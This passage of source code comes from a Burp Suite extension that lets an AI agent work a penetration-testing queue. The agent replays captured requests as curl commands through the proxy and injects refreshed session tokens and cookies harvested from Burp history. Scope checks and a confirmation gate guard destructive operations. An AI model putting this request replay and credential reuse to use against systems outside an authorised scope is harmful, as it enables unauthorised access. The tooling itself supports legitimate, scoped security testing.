                "scope.md": self._workspace_file_status("scope.md", 300),
                "target.md": self._workspace_file_status("target.md", 300),
                "findings.md": self._workspace_file_status("findings.md", 300)
            },
            "queue": {"total": total, "pending": pending, "claimed": claimed}
        }
        if include_auth:
            status, auth_payload = self._get_latest_auth_payload(host_filter, "", True, 100)
            checks["auth_latest"] = {
                "status": status,
                "host": host_filter,
                "usable": bool(status == 200 and auth_payload.get("recommended_auth", {}).get("usable")),
                "source_hosts": auth_payload.get("recommended_auth", {}).get("source_hosts", []) if status == 200 else [],
                "searched": auth_payload.get("searched", 0) if status == 200 else 0,
                "error": auth_payload.get("error", "") if status != 200 else ""
            }
        warnings = []
        if not checks["burp_proxy_listener"].get("reachable"):
            warnings.append("Burp Proxy listener 127.0.0.1:8080 is not reachable; target curl will not be captured.")
        if not checks["workspace_files"]["scope.md"].get("present"):
            warnings.append("scope.md is missing; active testing should wait for explicit scope confirmation.")
        if include_auth and not checks.get("auth_latest", {}).get("usable"):
            warnings.append("No usable auth material found in Burp history for %s." % host_filter)
        self._send_json(200, {
            "status": "ok" if not warnings else "warn",
            "checks": checks,
            "warnings": warnings,
            "next_steps": [
                "Use /api/agent/queue/<id>/curl?refresh_auth=true for target HTTP requests.",
                "Run generated target curl commands as-is; they include -x http://127.0.0.1:8080 and X-Double-Agent-Note.",
                "Local Double Agent API calls stay direct and do not use the Burp proxy flag."
            ]
        })

    def _handle_claim_queue(self, qid):
        try:
            qid = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                if q.get("id") == qid:
                    if q.get("status") in ("completed", "failed", "cancelled"):
                        self._send_json(409, {"error": "already terminal", "status": q.get("status")})
                        return
                    if q.get("status") == "claimed":
                        self._send_json(409, {"error": "already claimed", "id": qid})
                        return
                    q["status"] = "claimed"
                    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    q["claimed_at"] = now_str
                    q["last_heartbeat_at"] = now_str
                    self.extender._ui_dirty = True
                    self.extender._agent_queue_save_pending = True
                    timeout_sec = int(getattr(self.extender, "AGENT_CLAIM_TIMEOUT_SEC", 900))
                    self._send_json(200, {
                        "status": "claimed",
                        "id": qid,
                        "heartbeat_required_within_seconds": timeout_sec,
                        "heartbeat_url": "/api/agent/queue/%d/heartbeat" % qid
                    })
                    return
        self._send_json(404, {"error": "not found"})

    def _handle_release_queue(self, qid):
        try:
            qid = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": str(e)})
            return

        reason = self._limit_text(body.get("reason", ""), 500)
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                if q.get("id") == qid:
                    if q.get("status") in ("completed", "failed", "cancelled"):
                        self._send_json(409, {"error": "already terminal", "status": q.get("status")})
                        return
                    q["status"] = "pending"
                    q["claimed_at"] = None
                    if reason:
                        q.setdefault("notes", []).append({
                            "at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "note": "Released by agent: %s" % reason
                        })
                    self.extender._ui_dirty = True
                    self.extender._agent_queue_save_pending = True
                    self._send_json(200, {"status": "pending", "id": qid})
                    return
        self._send_json(404, {"error": "not found"})

    def _handle_queue_heartbeat(self, qid):
        """Refresh the activity timestamp on a claimed work item.

        Agents should ping this endpoint periodically (e.g. every 5 minutes)
        while actively working a long task to prevent the auto-release sweep
        from putting the item back into pending state.
        """
        try:
            qid = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                if q.get("id") == qid:
                    if q.get("status") != "claimed":
                        self._send_json(409, {"error": "not claimed", "status": q.get("status")})
                        return
                    q["last_heartbeat_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.extender._agent_queue_save_pending = True
                    timeout_sec = int(getattr(self.extender, "AGENT_CLAIM_TIMEOUT_SEC", 900))
                    self._send_json(200, {
                        "status": "ok",
                        "id": qid,
                        "heartbeat_at": q["last_heartbeat_at"],
                        "timeout_seconds": timeout_sec
                    })
                    return
        self._send_json(404, {"error": "not found"})

    def _limit_text(self, value, limit):
        text = str(value or "")
        if len(text) > limit:
            return text[:limit] + "... [truncated]"
        return text

    def _limit_list(self, value, limit):
        if not isinstance(value, list):
            return []
        return value[:limit]

    def _safe_ascii_text(self, value, limit=500):
        try:
            return self.extender._safe_ascii_text(value, limit)
        except:
            text = str(value or "")
            if len(text) > limit:
                text = text[:limit]
            try:
                return text.encode("ascii", "replace").decode("ascii")
            except:
                return text

    def _bool_query_value(self, query, name, default="true"):
        value = self._query_value(query, name, default).lower()
        return value not in ("0", "false", "no", "off")

    def _shell_quote(self, value):
        text = str(value or "")
        return "'" + text.replace("'", "'\"'\"'") + "'"

    def _split_raw_http_request(self, raw_request):
        text = str(raw_request or "")
        truncated = "... [truncated]" in text
        text = text.replace("\r\n", "\n").replace("\r", "\n")
        if "\n\n" in text:
            head, body = text.split("\n\n", 1)
        else:
            head, body = text, ""
        lines = [line for line in head.split("\n") if line is not None]
        request_line = lines[0].strip() if lines else ""
        parts = request_line.split()
        method = parts[0].upper() if len(parts) >= 1 else "GET"
        target = parts[1] if len(parts) >= 2 else ""
        headers = []
        for line in lines[1:]:
            if ":" not in line:
                continue
            name, value = line.split(":", 1)
            name = name.strip()
            if not name:
                continue
            headers.append({"name": name, "value": value.strip()})
        return {
            "request_line": request_line,
            "method": method,
            "target": target,
            "headers": headers,
            "body": body,
            "truncated": truncated
        }

    def _header_from_pairs(self, headers, name):
        name_l = str(name or "").lower()
        for header in headers or []:
            try:
                if str(header.get("name", "")).strip().lower() == name_l:
                    return str(header.get("value", "")).strip()
            except:
                pass
        return ""

    def _split_host_port(self, host_value):
        host_value = str(host_value or "").strip()
        if not host_value:
            return "", 0
        if host_value.startswith("[") and "]" in host_value:
            end = host_value.find("]")
            host = host_value[1:end]
            rest = host_value[end + 1:]
            if rest.startswith(":"):
                try:
                    return host, int(rest[1:])
                except:
                    return host, 0
            return host, 0
        if ":" in host_value:
            host, port = host_value.rsplit(":", 1)
            try:
                return host.strip(), int(port)
            except:
                return host_value, 0
        return host_value, 0

    def _url_host_port_protocol(self, url):
        parsed = urlparse.urlparse(str(url or ""))
        protocol = str(parsed.scheme or "").lower()
        netloc = str(parsed.netloc or "")
        if "@" in netloc:
            netloc = netloc.rsplit("@", 1)[1]
        host, port = self._split_host_port(netloc)
        if not port:
            try:
                parsed_port = parsed.port
            except:
                parsed_port = 0
            if parsed_port:
                port = int(parsed_port)
            elif protocol == "https":
                port = 443
            elif protocol == "http":
                port = 80
        return host.lower(), port, protocol

    def _candidate_url(self, candidate, parsed):
        url = str(candidate.get("url", "") or "").strip()
        target = str(parsed.get("target", "") or "").strip()
        if url.lower().startswith("http://") or url.lower().startswith("https://"):
            host, port, protocol = self._url_host_port_protocol(url)
            return url, host, port, protocol
        if target.lower().startswith("http://") or target.lower().startswith("https://"):
            host, port, protocol = self._url_host_port_protocol(target)
            return target, host, port, protocol

        host_header = self._header_from_pairs(parsed.get("headers", []), "Host")
        host, header_port = self._split_host_port(host_header)
        if not host:
            host = str(candidate.get("host", "") or "").strip()
        protocol = str(candidate.get("protocol", "") or "").strip().lower()
        if not protocol:
            protocol = "https"
        try:
            port = int(candidate.get("port", 0) or 0)
        except:
            port = 0
        if not port:
            port = header_port
        if not port:
            port = 443 if protocol == "https" else 80
        path = target or "/"
        if not path.startswith("/"):
            path = "/" + path
        netloc = host
        if (protocol == "https" and port != 443) or (protocol == "http" and port != 80):
            netloc = "%s:%d" % (host, port)
        return "%s://%s%s" % (protocol, netloc, path), host.lower(), port, protocol

    def _auth_header_name(self, name):
        name_l = str(name or "").strip().lower()
        return (
            name_l in set([
                "authorization", "cookie", "x-api-key", "api-key",
                "x-auth-token", "x-access-token", "x-id-token",
                "x-session-token", "x-csrf-token", "x-xsrf-token",
                "csrf-token", "x-csrftoken", "x-request-verification-token",
                "requestverificationtoken"
            ]) or "token" in name_l or "csrf" in name_l
        )

    def _parse_header_line(self, line):
        text = str(line or "")
        if ":" not in text:
            return None
        name, value = text.split(":", 1)
        name = name.strip()
        if not name:
            return None
        return {"name": name, "value": value.strip()}

    def _headers_for_curl(self, parsed, auth_header_lines, note):
        skip = set(["content-length", "connection", "proxy-connection", "accept-encoding"])
        headers = []
        replacing_auth = bool(auth_header_lines)
        for header in parsed.get("headers", []):
            name = str(header.get("name", "")).strip()
            value = str(header.get("value", "")).strip()
            name_l = name.lower()
            if name_l in skip:
                continue
            if name_l == "x-double-agent-note":
                continue
            if replacing_auth and self._auth_header_name(name):
                continue
            if name:
                headers.append({"name": name, "value": value})

        for line in auth_header_lines or []:
            parsed_line = self._parse_header_line(line)
            if parsed_line:
                headers.append(parsed_line)

        if note:
            headers.append({"name": "X-Double-Agent-Note", "value": note})
        return headers

    def _workspace_directory(self):
        try:
            return self.extender._workspace_directory()
        except Exception:
            pass
        try:
            project_dir = str(getattr(self, "PROJECT_WORKSPACE_DIR", "") or "").strip()
            if project_dir and os.path.isdir(project_dir):
                return os.path.abspath(project_dir)
        except Exception:
            pass
        try:
            return os.getcwd()
        except Exception:
            return "."

    def _workspace_file_status(self, name, preview_limit=500):
        base = self._workspace_directory()
        path = os.path.join(base, name)
        present = os.path.isfile(path)
        result = {"path": path, "present": bool(present)}
        if present:
            try:
                result["size"] = int(os.path.getsize(path))
                fh = open(path, "rb")
                try:
                    data = fh.read(preview_limit)
                finally:
                    fh.close()
                result["preview"] = data.decode("utf-8", "replace") if hasattr(data, "decode") else str(data)
            except Exception as e:
                result["read_error"] = self._safe_ascii_text(e)
        return result

    def _read_workspace_text(self, name, limit=100000):
        path = os.path.join(self._workspace_directory(), name)
        if not os.path.isfile(path):
            return ""
        try:
            fh = open(path, "rb")
            try:
                data = fh.read(limit)
            finally:
                fh.close()
            return data.decode("utf-8", "replace") if hasattr(data, "decode") else str(data)
        except:
            return ""

    def _extract_scope_hosts(self, scope_text):
        hosts = []
        seen = set()
        pattern = re.compile(r'(?i)(\*\.)?([a-z0-9][a-z0-9.-]*\.[a-z]{2,})(?::\d+)?')
        for match in pattern.finditer(str(scope_text or "")):
            host = (match.group(1) or "") + (match.group(2) or "")
            host = host.strip(".,;:()[]{}<>\"'").lower()
            if host and host not in seen:
                seen.add(host)
                hosts.append(host)
        return hosts[:200]

    def _scope_guard_for_url(self, url):
        host, port, protocol = self._url_host_port_protocol(url)
        if not host:
            return {
                "in_scope": None,
                "requires_confirmation": True,
                "reason": "could not determine target host",
                "host": host
            }
        scope_text = self._read_workspace_text("scope.md")
        if not scope_text:
            return {
                "scope_file_present": False,
                "in_scope": None,
                "requires_confirmation": True,
                "host": host,
                "reason": "scope.md missing or unreadable"
            }
        scope_hosts = self._extract_scope_hosts(scope_text)
        if not scope_hosts:
            return {
                "scope_file_present": True,
                "in_scope": None,
                "requires_confirmation": True,
                "host": host,
                "reason": "scope.md has no machine-readable host patterns"
            }
        for scope_host in scope_hosts:
            if scope_host.startswith("*."):
                suffix = scope_host[2:]
                if host == suffix or host.endswith("." + suffix):
                    return {
                        "scope_file_present": True,
                        "in_scope": True,
                        "requires_confirmation": False,
                        "host": host,
                        "matched": scope_host
                    }
            elif host == scope_host or host.endswith("." + scope_host):
                return {
                    "scope_file_present": True,
                    "in_scope": True,
                    "requires_confirmation": False,
                    "host": host,
                    "matched": scope_host
                }
        return {
            "scope_file_present": True,
            "in_scope": False,
            "requires_confirmation": True,
            "host": host,
            "reason": "target host was not found in scope.md",
            "scope_hosts_sample": scope_hosts[:20]
        }

    def _safety_gate_for_request(self, method, url):
        method_u = str(method or "GET").upper()
        parsed = urlparse.urlparse(str(url or ""))
        path_l = str(parsed.path or "").lower()
        keywords = [
            "delete", "remove", "destroy", "disable", "password", "reset",
            "payment", "checkout", "refund", "transfer", "withdraw", "order",
            "purchase", "upload", "import", "invite", "admin"
        ]
        reasons = []
        if method_u in ("DELETE", "PUT", "PATCH"):
            reasons.append("method %s can change state" % method_u)
        if method_u == "POST":
            for keyword in keywords:
                if keyword in path_l:
                    reasons.append("POST path contains '%s'" % keyword)
                    break
        return {
            "requires_confirmation": bool(reasons),
            "method": method_u,
            "reasons": reasons,
            "safe_to_auto_test": not bool(reasons)
        }

    def _check_tcp_listener(self, host, port, timeout_ms=750):
        sock = None
        try:
            sock = Socket()
            sock.connect(InetSocketAddress(host, int(port)), int(timeout_ms))
            return {"host": host, "port": int(port), "reachable": True}
        except Exception as e:
            return {
                "host": host,
                "port": int(port),
                "reachable": False,
                "error": self._safe_ascii_text(e, 300)
            }
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def _queue_target_candidates(self, item, findings_full=None):
        candidates = []
        seen = set()

        def add_candidate(source, label, request_data, url="", method="", host="", port=0, protocol="", step=None, active_test_recipe=None):
            request_data = request_data or ""
            url = url or ""
            if not request_data and not url:
                return
            key = "%s|%s|%s" % (source, url, request_data[:500])
            if key in seen:
                return
            seen.add(key)
            parsed = self._split_raw_http_request(request_data)
            candidate = {
                "source": source,
                "label": label,
                "step": step,
                "request_data": request_data,
                "url": url,
                "method": method or parsed.get("method", "GET"),
                "host": host,
                "port": port,
                "protocol": protocol,
                "active_test_recipe": active_test_recipe or {}
            }
            candidates.append(candidate)

        add_candidate(
                "queue_item", "primary request",
                item.get("request_data", ""), item.get("url", ""),
                item.get("method", ""), item.get("host", ""),
                item.get("port", 0), item.get("protocol", ""), None,
                item.get("active_test_recipe", {}))

        for step in item.get("flow_requests", []) or []:
            if not isinstance(step, dict):
                continue
            add_candidate(
                "flow_request", "flow step %s" % step.get("step", ""),
                step.get("request_data", ""), step.get("url", ""),
                step.get("method", ""), step.get("host", ""),
                step.get("port", 0), step.get("protocol", ""),
                step.get("step", None), step.get("active_test_recipe", {}))

        for finding in findings_full or []:
            if not isinstance(finding, dict):
                continue
            add_candidate(
                "finding", "finding #%s" % finding.get("id", ""),
                finding.get("request_data", ""), finding.get("url", ""),
                "", "", 0, "", finding.get("id", None),
                finding.get("active_test_recipe", {}))

        return candidates

    def _build_target_curl(self, candidate, queue_id=0, refresh_auth=True, note=""):
        parsed = self._split_raw_http_request(candidate.get("request_data", ""))
        method = str(candidate.get("method", "") or parsed.get("method", "GET") or "GET").upper()
        url, host, port, protocol = self._candidate_url(candidate, parsed)
        warnings = []
        auth_header_lines = []
        auth_source = "captured_request"
        auth_payload = None

        if parsed.get("truncated"):
            warnings.append("request_data is truncated; rebuild from Burp history before relying on body/header completeness")

        if refresh_auth and host:
            status, payload = self._get_latest_auth_payload(host, "", True, 100)
            auth_payload = payload
            if status == 200 and payload.get("recommended_auth", {}).get("usable"):
                auth_header_lines = payload.get("recommended_auth", {}).get("raw_header_lines", [])
                auth_source = "auth/latest"
            elif status != 200:
                warnings.append("auth/latest failed: %s" % payload.get("error", "unknown error"))
            else:
                warnings.append("auth/latest returned no usable auth; using captured request auth if present")

        if not note:
            note = "Agent: queue #%s - replay target request - expect baseline behavior" % queue_id
        headers = self._headers_for_curl(parsed, auth_header_lines, note)

        command_parts = [
            "curl", "-x", "http://127.0.0.1:8080",
            "--path-as-is", "-k", "-i", "-sS",
            "-X", self._shell_quote(method)
        ]
        for header in headers:
            line = "%s: %s" % (header.get("name", ""), header.get("value", ""))
            command_parts.extend(["-H", self._shell_quote(line)])
        body = parsed.get("body", "")
        if body:
            command_parts.extend(["--data-binary", self._shell_quote(body)])
        command_parts.append(self._shell_quote(url))

        scope_guard = self._scope_guard_for_url(url)
        safety_gate = self._safety_gate_for_request(method, url)
        requires_confirmation = bool(scope_guard.get("requires_confirmation") or safety_gate.get("requires_confirmation"))
        if scope_guard.get("in_scope") is False:
            warnings.append("scope guard says target host is outside scope.md")
        if safety_gate.get("requires_confirmation"):
            warnings.append("safety gate requires user confirmation: %s" % "; ".join(safety_gate.get("reasons", [])))

        return {
            "ok": bool(url and host),
            "command": " ".join(command_parts),
            "proxy": "http://127.0.0.1:8080",
            "method": method,
            "url": url,
            "host": host,
            "port": port,
            "protocol": protocol,
            "note_header": note,
            "auth": {
                "source": auth_source,
                "refreshed": auth_source == "auth/latest",
                "recommended_auth": (auth_payload or {}).get("recommended_auth", {}) if auth_payload else {}
            },
            "scope_guard": scope_guard,
            "safety_gate": safety_gate,
            "requires_confirmation": requires_confirmation,
            "warnings": warnings
        }

    def _queue_operational_metadata(self, item, findings_full=None):
        candidates = self._queue_target_candidates(item, findings_full)
        qid = item.get("id", 0)
        source = str(item.get("source", "") or "")
        browser_verify = bool(item.get("browser_verify", False))
        active_recipe = {}
        for finding in findings_full or []:
            if isinstance(finding, dict) and finding.get("active_test_recipe"):
                active_recipe = finding.get("active_test_recipe", {})
                break
        if not active_recipe and isinstance(item.get("active_test_recipe", {}), dict):
            active_recipe = item.get("active_test_recipe", {})

        if browser_verify:
            transport = "browseros"
            instruction = "Use BrowserOS MCP only; BrowserOS must be launched with --proxy-server=127.0.0.1:8080."
        elif candidates:
            transport = "curl_proxy"
            instruction = "Call /api/agent/queue/%s/curl?refresh_auth=true and run the generated curl command with -x http://127.0.0.1:8080." % qid
        elif source.startswith("websocket"):
            transport = "browseros_or_manual"
            instruction = "Use BrowserOS/manual WebSocket tooling through Burp; native curl is not enough for this item."
        elif source == "report_support":
            transport = "report_only"
            instruction = "No target traffic is needed; use current findings, target notes, and completed queue results."
        else:
            transport = "manual"
            instruction = "No replayable HTTP request is attached; inspect the item and ask for context if needed."

        scope_guard = {}
        safety_gate = {}
        if candidates:
            parsed = self._split_raw_http_request(candidates[0].get("request_data", ""))
            url, host, port, protocol = self._candidate_url(candidates[0], parsed)
            method = candidates[0].get("method", "") or parsed.get("method", "GET")
            scope_guard = self._scope_guard_for_url(url)
            safety_gate = self._safety_gate_for_request(method, url)

        safe_to_auto_test = (
            transport == "curl_proxy" and
            scope_guard.get("in_scope") is not False and
            not scope_guard.get("requires_confirmation", False) and
            not safety_gate.get("requires_confirmation", False)
        )

        return {
            "recommended_transport": transport,
            "must_proxy": transport in ("curl_proxy", "browseros"),
            "curl_endpoint": "/api/agent/queue/%s/curl?refresh_auth=true" % qid if candidates and not browser_verify else "",
            "request_candidates": len(candidates),
            "requires_auth_refresh": "call auth/latest automatically via curl endpoint before replay",
            "scope_guard": scope_guard,
            "safety_gate": safety_gate,
            "safe_to_auto_test": bool(safe_to_auto_test),
            "active_test_recipe": active_recipe,
            "instruction": instruction
        }

    def _get_queue_item_snapshot(self, qid):
        try:
            qid = int(qid)
        except:
            return None
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                if q.get("id") == qid:
                    return dict(q)
        return None

    def _queue_findings_full(self, item):
        findings_full = []
        with self.extender.findings_lock_ui:
            for fid in item.get("finding_ids", []):
                if 0 <= fid < len(self.extender.findings_list):
                    f = self.extender.findings_list[fid]
                    findings_full.append(self._serialize_finding(fid, f, include_full=True))
        return findings_full

    def _build_queue_curl_payload(self, item, findings_full, refresh_auth=True, step_filter=""):
        if bool(item.get("browser_verify", False)):
            return 409, {
                "error": "browser verification item",
                "message": "This work item has browser_verify=true. Use BrowserOS MCP through Burp proxy, not curl."
            }
        candidates = self._queue_target_candidates(item, findings_full)
        if step_filter:
            filtered = []
            for candidate in candidates:
                if str(candidate.get("step", "")) == str(step_filter) or str(candidate.get("label", "")) == str(step_filter):
                    filtered.append(candidate)
            candidates = filtered
        if not candidates:
            return 404, {"error": "no replayable HTTP request attached to this queue item"}

        qid = item.get("id", 0)
        commands = []
        for index, candidate in enumerate(candidates):
            recipe = candidate.get("active_test_recipe", {}) or {}
            if recipe:
                purpose = self._safe_ascii_text(recipe.get("active_test_type", "active validation"), 60)
                expected = self._safe_ascii_text(recipe.get("expected_vulnerable_signal", "compare with safe baseline"), 120)
                note = "Agent: queue #%s - %s active test - %s" % (qid, purpose, expected)
            else:
                note = "Agent: queue #%s - %s - replay target request" % (qid, candidate.get("label", "request"))
            built = self._build_target_curl(candidate, qid, refresh_auth=refresh_auth, note=note)
            built["index"] = index + 1
            built["source"] = candidate.get("source", "")
            built["label"] = candidate.get("label", "")
            built["step"] = candidate.get("step", None)
            if recipe:
                built["active_test_recipe"] = recipe
            commands.append(built)

        return 200, {
            "queue_id": qid,
            "refresh_auth": bool(refresh_auth),
            "proxy_required": "http://127.0.0.1:8080",
            "commands": commands,
            "usage": "Run the generated command as-is for target traffic. Local Double Agent API calls remain direct and do not use -x."
        }

    def _normalize_queue_outcome(self, value):
        outcome = str(value or "inconclusive").strip().lower().replace("_", "-").replace(" ", "-")
        valid = set(["confirmed", "not-vulnerable", "needs-more-info", "inconclusive", "failed"])
        return outcome if outcome in valid else "inconclusive"

    def _sanitize_result_items(self, items):
        cleaned = []
        for item in self._limit_list(items, 25):
            if isinstance(item, dict):
                cleaned.append({
                    "title": self._limit_text(item.get("title", item.get("test", "")), 300),
                    "outcome": self._normalize_queue_outcome(item.get("outcome", "")),
                    "detail": self._limit_text(item.get("detail", ""), 1000),
                    "evidence": self._limit_text(item.get("evidence", ""), 2000)
                })
            else:
                cleaned.append({
                    "title": self._limit_text(item, 300),
                    "outcome": "inconclusive",
                    "detail": "",
                    "evidence": ""
                })
        return cleaned

    def _sanitize_evidence_items(self, items):
        cleaned = []
        for item in self._limit_list(items, 25):
            if not isinstance(item, dict):
                cleaned.append({"notes": self._limit_text(item, 2000)})
                continue
            status_code = item.get("status_code", item.get("status", None))
            try:
                status_code = int(status_code) if status_code is not None and status_code != "" else None
            except:
                status_code = None
            cleaned.append({
                "request": self._limit_text(item.get("request", item.get("curl", "")), 6000),
                "status_code": status_code,
                "response_snippet": self._limit_text(item.get("response_snippet", item.get("response", "")), 6000),
                "notes": self._limit_text(item.get("notes", item.get("detail", "")), 2000),
                "auth_source": self._limit_text(item.get("auth_source", item.get("auth", "")), 300),
                "burp_history_ref": self._limit_text(item.get("burp_history_ref", item.get("burp_history_index", "")), 300),
                "hypothesis": self._limit_text(item.get("hypothesis", item.get("test_purpose", "")), 500)
            })
        return cleaned

    def _handle_queue_result(self, qid):
        try:
            qid = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": str(e)})
            return

        outcome = self._normalize_queue_outcome(body.get("outcome", body.get("status", "inconclusive")))
        assessment = self._limit_text(body.get("assessment", ""), 4000)
        test_results = self._sanitize_result_items(body.get("test_results", []))
        evidence = self._sanitize_evidence_items(body.get("evidence", []))
        reproduction = self._limit_text(body.get("reproduction", body.get("repro", "")), 4000)
        notes = []
        for note in self._limit_list(body.get("notes", []), 20):
            notes.append({
                "at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "note": self._limit_text(note, 1000)
            })

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        terminal_status = "failed" if outcome == "failed" else "completed"
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                if q.get("id") == qid:
                    if q.get("status") == "pending":
                        self._send_json(409, {"error": "must claim item before posting result", "status": q.get("status")})
                        return
                    if q.get("status") in ("completed", "failed", "cancelled"):
                        self._send_json(409, {"error": "already terminal", "status": q.get("status")})
                        return
                    q["status"] = terminal_status
                    q["completed_at"] = now
                    q["outcome"] = outcome
                    q["assessment"] = assessment
                    q["test_results"] = test_results
                    q["evidence"] = evidence
                    q["reproduction"] = reproduction
                    if notes:
                        q.setdefault("notes", []).extend(notes)
                    q["result_updated_at"] = now
                    self.extender._ui_dirty = True
                    self.extender._agent_queue_save_pending = True
                    self.extender.stdout.println("[AGENT API] Stored result for queue #%d: %s" % (qid, outcome))
                    self._send_json(200, {"status": terminal_status, "id": qid, "outcome": outcome})
                    return
        self._send_json(404, {"error": "not found"})

    def _handle_clear_queue(self):
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": str(e)})
            return

        mode = str(body.get("mode", "completed") or "completed").strip().lower()
        if mode not in ("completed", "all"):
            self._send_json(400, {"error": "mode must be completed or all"})
            return

        with self.extender.agent_queue_lock:
            before = len(self.extender.agent_queue)
            if mode == "all":
                self.extender.agent_queue = []
                self.extender.agent_queue_next_id = 0
                self.extender.selected_agent_queue_index = -1
            else:
                self.extender.agent_queue = [
                    q for q in self.extender.agent_queue
                    if q.get("status") not in ("completed", "failed", "cancelled")
                ]
                if self.extender.selected_agent_queue_index >= len(self.extender.agent_queue):
                    self.extender.selected_agent_queue_index = len(self.extender.agent_queue) - 1
            removed = before - len(self.extender.agent_queue)

        self.extender.save_agent_queue()
        self.extender._ui_dirty = True
        self.extender.stdout.println("[AGENT API] Cleared queue mode=%s removed=%d remaining=%d" % (
            mode, removed, len(self.extender.agent_queue)))
        self._send_json(200, {
            "status": "ok",
            "mode": mode,
            "removed": removed,
            "remaining": len(self.extender.agent_queue)
        })

    def _coerce_bool(self, value, default=False):
        if value is None:
            return bool(default)
        try:
            if isinstance(value, bool):
                return value
        except Exception:
            pass
        text = str(value).strip().lower()
        if text in ("1", "true", "yes", "on"):
            return True
        if text in ("0", "false", "no", "off"):
            return False
        return bool(default)

    def _read_sse_event(self, stream, deadline):
        event_name = ""
        data_lines = []
        while time.time() < deadline:
            line = stream.readline()
            if line is None:
                continue
            if hasattr(line, "decode"):
                try:
                    line = line.decode("utf-8", "replace")
                except Exception:
                    line = str(line)
            line = str(line).rstrip("\r\n")
            if line == "":
                if event_name or data_lines:
                    return event_name, "\n".join(data_lines)
                continue
            if line.startswith("event:"):
                event_name = line[len("event:"):].strip()
            elif line.startswith("data:"):
                data_lines.append(line[len("data:"):].strip())
        raise Exception("timeout waiting for MCP SSE event")

    def _mcp_post_json(self, url, payload, timeout_sec):
        body = json.dumps(payload)
        req = urllib2.Request(url, body, {"Content-Type": "application/json"})
        resp = urllib2.urlopen(req, timeout=timeout_sec)
        try:
            return resp.read()
        finally:
            try:
                resp.close()
            except Exception:
                pass

    def _mcp_read_message(self, stream, expected_id, deadline):
        while time.time() < deadline:
            event_name, data = self._read_sse_event(stream, deadline)
            if event_name != "message" or not data:
                continue
            msg = json.loads(data)
            if msg.get("id") == expected_id:
                if msg.get("error"):
                    raise Exception("MCP error: %s" % self._safe_ascii_text(msg.get("error"), 1000))
                return msg
        raise Exception("timeout waiting for MCP response id=%s" % expected_id)

    def _portswigger_mcp_call_tool(self, tool_name, arguments, timeout_sec=12):
        base_url = str(getattr(self.extender, "PORTSWIGGER_MCP_URL", "http://127.0.0.1:9876/") or "").strip()
        if not base_url:
            base_url = "http://127.0.0.1:9876/"
        if not base_url.endswith("/"):
            base_url += "/"

        stream = None
        try:
            deadline = time.time() + max(3, int(timeout_sec))
            stream = urllib2.urlopen(base_url, timeout=max(3, int(timeout_sec)))
            endpoint = ""
            while time.time() < deadline:
                event_name, data = self._read_sse_event(stream, deadline)
                if event_name == "endpoint" and data:
                    endpoint = data.strip()
                    break
            if not endpoint:
                raise Exception("MCP server did not return a session endpoint")

            if endpoint.startswith("http://") or endpoint.startswith("https://"):
                session_url = endpoint
            elif endpoint.startswith("?"):
                session_url = base_url + endpoint
            else:
                session_url = base_url.rstrip("/") + "/" + endpoint.lstrip("/")

            init_id = 1
            call_id = 2
            self._mcp_post_json(session_url, {
                "jsonrpc": "2.0",
                "id": init_id,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {"roots": {"listChanged": True}, "sampling": {}},
                    "clientInfo": {"name": "double-agent", "version": str(getattr(self.extender, "VERSION", "2.1"))}
                }
            }, timeout_sec)
            self._mcp_read_message(stream, init_id, deadline)
            self._mcp_post_json(session_url, {
                "jsonrpc": "2.0",
                "method": "notifications/initialized",
                "params": {}
            }, timeout_sec)
            self._mcp_post_json(session_url, {
                "jsonrpc": "2.0",
                "id": call_id,
                "method": "tools/call",
                "params": {"name": tool_name, "arguments": arguments}
            }, timeout_sec)
            msg = self._mcp_read_message(stream, call_id, deadline)
            return msg.get("result", {})
        finally:
            try:
                if stream is not None:
                    stream.close()
            except Exception:
                pass

    def _handle_agent_request_http2(self):
        """Delegate an HTTP/2 request to the PortSwigger MCP extension."""
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": "invalid body", "message": str(e)})
            return

        target_host = str(body.get("targetHostname", body.get("host", "")) or "").strip()
        try:
            target_port = int(body.get("targetPort", body.get("port", 443)) or 443)
        except Exception:
            self._send_json(400, {"error": "targetPort/port must be an integer"})
            return
        uses_https = self._coerce_bool(body.get("usesHttps", body.get("https", True)), True)
        headers = body.get("headers", {})
        pseudo_headers = body.get("pseudoHeaders", body.get("pseudo_headers", {}))
        request_body = body.get("requestBody", body.get("body", ""))

        if not target_host:
            self._send_json(400, {"error": "targetHostname/host is required"})
            return
        if not isinstance(headers, dict):
            self._send_json(400, {"error": "headers must be an object"})
            return
        if not isinstance(pseudo_headers, dict):
            self._send_json(400, {"error": "pseudoHeaders must be an object"})
            return

        if not pseudo_headers:
            method = str(body.get("method", "GET") or "GET").upper()
            path = str(body.get("path", "/") or "/")
            if not path.startswith("/"):
                path = "/" + path
            pseudo_headers = {
                ":method": method,
                ":path": path,
                ":scheme": "https" if uses_https else "http",
                ":authority": target_host
            }

        arguments = {
            "targetHostname": target_host,
            "targetPort": target_port,
            "usesHttps": bool(uses_https),
            "pseudoHeaders": pseudo_headers,
            "headers": headers,
            "requestBody": str(request_body or "")
        }

        try:
            result = self._portswigger_mcp_call_tool("send_http2_request", arguments)
            self._send_json(200, {
                "transport": "portswigger_mcp",
                "mcp_url": str(getattr(self.extender, "PORTSWIGGER_MCP_URL", "")),
                "mcp_tool": "send_http2_request",
                "arguments_summary": {
                    "targetHostname": target_host,
                    "targetPort": target_port,
                    "usesHttps": bool(uses_https),
